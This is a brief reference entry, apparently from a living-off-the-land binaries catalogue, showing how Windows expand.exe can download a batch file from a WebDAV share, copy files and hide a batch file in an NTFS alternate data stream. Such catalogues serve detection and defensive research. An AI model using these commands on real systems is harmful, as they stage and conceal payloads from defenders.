## Expand.exe

* Functions: Download, Copy, Add ADS

```
expand \\webdav\folder\file.bat c:\ADS\file.bat    

expand c:\ADS\file1.bat c:\ADS\file2.bat    

expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat     
```
